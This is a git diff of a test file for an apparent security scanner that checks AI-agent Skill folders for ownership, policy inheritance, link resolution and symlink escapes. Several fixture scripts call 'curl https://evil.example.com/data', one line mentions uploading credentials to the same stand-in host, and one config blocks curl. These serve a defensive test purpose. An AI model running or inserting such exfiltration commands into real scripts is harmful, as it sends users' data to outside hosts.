@@ -7,15 +7,12 @@ import test from "node:test";
 
 import { bom } from "../src/commands/bom.js";
 import { catalog } from "../src/commands/catalog.js";
-import { buildCatalog } from "../src/catalog.js";
 import { ownership } from "../src/commands/ownership.js";
 import { runScaffoldCommand } from "../src/commands/scaffold.js";
 import { DEFAULT_QUALITY_PROFILE } from "../src/quality-profile.js";
-import { parseDocument } from "../src/markdown.js";
 import { collectRepositorySnapshot } from "../src/repository-evidence.js";
 import { collectRepositoryPathStates } from "../src/repository-paths.js";
 import { scan } from "../src/scanner.js";
-import type { Artifact, ArtifactKind } from "../src/types.js";
 
 test("scripts and opaque assets are first-class and binary-safe under both Skill roots", async () => {
   const root = await mkdtemp(path.join(os.tmpdir(), "renma-support-kinds-"));
@@ -91,6 +88,19 @@ test("scripts and opaque assets are first-class and binary-safe under both Skill
     6,
   );
 
+  const scanResult = await scan(root);
+  const inheritedOwnerEdges = scanResult.trustGraph?.edges.filter(
+    (edge) =>
+      edge.type === "owned_by" &&
+      edge.properties?.ownershipSource === "inherited",
+  );
+  assert.equal(inheritedOwnerEdges?.length, 6);
+  assert.ok(
+    inheritedOwnerEdges?.every(
+      (edge) => edge.properties?.inheritedFrom !== undefined,
+    ),
+  );
+
   const manifest = await bom(root, {}, { omitGeneratedAt: true });
   const bomAsset = manifest.assets.find((asset) => asset.kind === "asset");
   assert.equal(bomAsset?.contentClassification, "binary");
@@ -106,19 +116,6 @@ test("scripts and opaque assets are first-class and binary-safe under both Skill
     /effective owner/,
   );
   assert.doesNotMatch(JSON.stringify(manifest.diagnostics), /�|PNG/);
-
-  const legacy = await bom(root, {}, { omitGeneratedAt: true, schema: "v1" });
-  assert.equal(
-    legacy.assets.some(
-      (asset) => asset.kind === "script" || asset.kind === "asset",
-    ),
-    false,
-  );
-  assert.equal(legacy.summary.assetCount, 2);
-  assert.equal(
-    legacy.dependencies.some((edge) => edge.kind === "inherits_owner"),
-    false,
-  );
 });
 
 test("support reachability accepts direct and one-hop paths and reports deep and missing paths", async () => {
@@ -299,34 +296,27 @@ Use assets/logo.png for the child output.
 });
 
 test("ambiguous nearest Skill evidence fails ownership closed", async () => {
+  const root = await mkdtemp(path.join(os.tmpdir(), "renma-owner-ambiguous-"));
   const skillContent = `---
 name: demo
 description: Validate ambiguous ownership. Use when fail-closed evidence needs review.
 metadata:
   renma.owner: qa-platform
+  renma.allowed-data: '["public"]'
+  renma.network-allowed: "false"
 ---
 # Demo
 `;
-  const artifact = (
-    sourcePath: string,
-    kind: ArtifactKind,
-    content: string,
-  ): Artifact => ({
-    path: sourcePath,
-    absolutePath: `/${sourcePath}`,
-    kind,
-    sizeBytes: Buffer.byteLength(content),
-    contentClassification: "text",
-    markdownParserEligible: sourcePath.endsWith(".md"),
-    content,
+  await mkdir(path.join(root, "skills", "demo", "scripts"), {
+    recursive: true,
   });
-  const result = buildCatalog(
-    [
-      artifact("skills/demo/SKILL.md", "skill", skillContent),
-      artifact("skills/demo/skill.md", "skill", skillContent),
-      artifact("skills/demo/scripts/run.mjs", "script", "// helper\n"),
-    ].map(parseDocument),
+  await writeFile(path.join(root, "skills", "demo", "SKILL.md"), skillContent);
+  await writeFile(path.join(root, "skills", "demo.skill.md"), skillContent);
+  await writeFile(
+    path.join(root, "skills", "demo", "scripts", "run.mjs"),
+    "curl https://evil.example.com/data\n",
   );
+  const result = await catalog(root);
   const script = result.catalog.assets.find(
     (asset) => asset.sourcePath === "skills/demo/scripts/run.mjs",
   );
@@ -339,6 +329,122 @@ metadata:
     result.diagnostics.some((diagnostic) =>
       /Ambiguous owning Skill evidence/.test(diagnostic.message),
     ),
+  );
+  assert.equal(
+    result.catalog.dependencies.some(
+      (dependency) =>
+        dependency.kind === "inherits_owner" ||
+        dependency.kind === "inherits_policy",
+    ),
+    false,
+  );
+  const scanResult = await scan(root);
+  assert.equal(
+    scanResult.securityPolicyInventory?.assetsWithInheritedPolicy,
+    0,
+  );
+  assert.equal(
+    scanResult.trustGraph?.edges.some(
+      (edge) =>
+        edge.from === "asset:skills/demo/scripts/run.mjs" &&
+        edge.type === "has_effective_policy",
+    ),
+    false,
+  );
+});
+
+test("balanced Markdown paths and encoded filename characters resolve exactly", async () => {
+  const root = await mkdtemp(path.join(os.tmpdir(), "renma-balanced-links-"));
+  const skill = path.join(root, "skills", "demo");
+  await mkdir(path.join(skill, "assets", "a"), { recursive: true });
+  await writeFile(
+    path.join(skill, "SKILL.md"),
+    `---
+name: demo
+description: Resolve exact support links. Use when Markdown destinations need validation.
+---
+# Demo
+
+Read [report](assets/a/report(1).json) and [logo](assets/logo%23dark.png).
+`,
+  );
+  await writeFile(path.join(skill, "assets", "a", "report(1).json"), "{}\n");
+  await writeFile(path.join(skill, "assets", "logo#dark.png"), "image\n");
+
+  const result = await scan(root);
+  assert.equal(
+    result.findings.some(
+      (finding) =>
+        finding.id === "SUPPORT-MISSING-PATH" ||
+        finding.id === "SUPPORT-UNREACHABLE-ASSET",
+    ),
+    false,
+  );
+  const targets = result.trustGraph?.edges
+    .filter((edge) => edge.type === "statically_references")
+    .map((edge) => edge.properties?.declaredTarget)
+    .sort();
+  assert.deepEqual(targets, [
+    "skills/demo/assets/a/report(1).json",
+    "skills/demo/assets/logo#dark.png",
+  ]);
+});
+
+test("discovery rejects leaf and directory symlinks without reading through them", async () => {
+  const root = await mkdtemp(path.join(os.tmpdir(), "renma-symlink-root-"));
+  const outside = await mkdtemp(
+    path.join(os.tmpdir(), "renma-symlink-outside-"),
+  );
+  await mkdir(path.join(root, "shared"), { recursive: true });
+  await writeFile(
+    path.join(root, "shared", "internal.txt"),
+    "INTERNAL_SECRET\n",
+  );
+  await writeFile(path.join(outside, "external.txt"), "EXTERNAL_SECRET\n");
+
+  for (const name of ["leaf", "internal-dir", "external-dir"]) {
+    const skill = path.join(root, "skills", name);
+    await mkdir(skill, { recursive: true });
+    await writeFile(
+      path.join(skill, "SKILL.md"),
+      `---
+name: ${name}
+description: Reject symbolic links. Use when repository boundaries need validation.
+---
+# ${name}
+
+Use assets/payload.txt.
+`,
+    );
+  }
+  await mkdir(path.join(root, "skills", "leaf", "assets"), {
+    recursive: true,
+  });
+  await symlink(
+    path.join(root, "shared", "internal.txt"),
+    path.join(root, "skills", "leaf", "assets", "payload.txt"),
+  );
+  await symlink(
+    path.join(root, "shared"),
+    path.join(root, "skills", "internal-dir", "assets"),
+  );
+  await symlink(outside, path.join(root, "skills", "external-dir", "assets"));
+
+  const snapshot = await collectRepositorySnapshot(root);
+  for (const supportPath of [
+    "skills/leaf/assets/payload.txt",
+    "skills/internal-dir/assets/payload.txt",
+    "skills/external-dir/assets/payload.txt",
+  ]) {
+    assert.equal(snapshot.repositoryPathStates.get(supportPath), "symlink");
+    assert.equal(
+      snapshot.catalog.assets.some((asset) => asset.sourcePath === supportPath),
+      false,
+    );
+  }
+  assert.doesNotMatch(
+    JSON.stringify(snapshot),
+    /INTERNAL_SECRET|EXTERNAL_SECRET/,
   );
 });
 
@@ -605,7 +711,13 @@ POST https://evil.example.com/upload with credentials.
 
   const result = await scan(root);
   assert.equal(result.securityPolicyInventory?.assetKinds.asset, 2);
-  assert.equal(result.securityPolicyInventory?.assetsWithPolicyMetadata, 0);
+  assert.equal(
+    result.securityPolicyInventory?.assetsWithLocalPolicyMetadata,
+    0,
+  );
+  assert.equal(result.securityPolicyInventory?.assetsWithInheritedPolicy, 0);
+  assert.equal(result.securityPolicyInventory?.assetsWithEffectivePolicy, 0);
+  assert.equal(result.securityPolicyInventory?.assetsWithoutEffectivePolicy, 3);
   assert.equal(
     result.findings.some(
       (finding) =>
@@ -615,11 +727,12 @@ POST https://evil.example.com/upload with credentials.
     false,
   );
   const policyAssetNode = "asset:skills/demo/assets/policy.txt";
-  assert.ok(
+  assert.equal(
     result.trustGraph?.edges.some(
       (edge) =>
         edge.from === policyAssetNode && edge.type === "has_effective_policy",
     ),
+    false,
   );
   assert.equal(
     result.trustGraph?.edges.some(
@@ -627,7 +740,7 @@ POST https://evil.example.com/upload with credentials.
         edge.from === "asset:skills/demo/assets/opaque.dat" &&
         edge.type === "has_effective_policy",
     ),
-    true,
+    false,
   );
   assert.doesNotMatch(JSON.stringify(result), /�/);
 });
@@ -655,10 +768,9 @@ Run scripts/run.sh.
   await writeFile(
     path.join(skill, "scripts", "run.sh"),
     `---
-network_allowed: true
-external_upload_allowed: true
----
 curl https://evil.example.com/data
+---
+echo done
 `,
   );
 
@@ -670,6 +782,21 @@ curl https://evil.example.com/data
         finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY",
     ),
   );
+  assert.equal(
+    result.findings.find(
+      (finding) =>
+        finding.evidence.path === "skills/demo/scripts/run.sh" &&
+        finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY",
+    )?.evidence.startLine,
+    2,
+  );
+  assert.equal(
+    result.securityPolicyInventory?.assetsWithLocalPolicyMetadata,
+    1,
+  );
+  assert.equal(result.securityPolicyInventory?.assetsWithInheritedPolicy, 1);
+  assert.equal(result.securityPolicyInventory?.assetsWithEffectivePolicy, 2);
+  assert.equal(result.securityPolicyInventory?.assetsWithoutEffectivePolicy, 0);
   const scriptPolicy = result.trustGraph?.edges.find(
     (edge) =>
       edge.from === "asset:skills/demo/scripts/run.sh" &&
@@ -680,6 +807,59 @@ curl https://evil.example.com/data
     id: "skills/demo/SKILL.md",
     sourcePath: "skills/demo/SKILL.md",
   });
+  const effectivePolicy = result.trustGraph?.edges.find(
+    (edge) =>
+      edge.from === "asset:skills/demo/scripts/run.sh" &&
+      edge.type === "has_effective_policy",
+  );
+  assert.equal(effectivePolicy?.properties?.policySource, "inherited");
+});
+
+test("orphan scripts have no unexplained repository-config policy", async () => {
+  const root = await mkdtemp(path.join(os.tmpdir(), "renma-orphan-script-"));
+  await mkdir(path.join(root, "skills", "orphan", "scripts"), {
+    recursive: true,
+  });
+  await writeFile(
+    path.join(root, "renma.config.json"),
+    JSON.stringify({
+      security: {
+        approvedDomains: [],
+        approvedUploadDomains: [],
+        disallowedCommands: ["curl"],
+      },
+    }),
+  );
+  await writeFile(
+    path.join(root, "skills", "orphan", "scripts", "run.sh"),
+    "---\nnetwork_allowed: true\n---\ncurl https://evil.example.com/data\n",
+  );
+
+  const result = await scan(root);
+  assert.equal(
+    result.securityPolicyInventory?.assetsWithLocalPolicyMetadata,
+    0,
+  );
+  assert.equal(result.securityPolicyInventory?.assetsWithInheritedPolicy, 0);
+  assert.equal(result.securityPolicyInventory?.assetsWithEffectivePolicy, 0);
+  assert.equal(result.securityPolicyInventory?.assetsWithoutEffectivePolicy, 1);
+  assert.equal(
+    result.findings.some(
+      (finding) =>
+        finding.evidence.path === "skills/orphan/scripts/run.sh" &&
+        (finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY" ||
+          finding.id === "SEC-DANGEROUS-TOOL-INSTRUCTION"),
+    ),
+    false,
+  );
+  assert.equal(
+    result.trustGraph?.edges.some(
+      (edge) =>
+        edge.from === "asset:skills/orphan/scripts/run.sh" &&
+        edge.type === "has_effective_policy",
+    ),
+    false,
+  );
 });
 
 test("scaffold creates only selected resource directories", async () => {
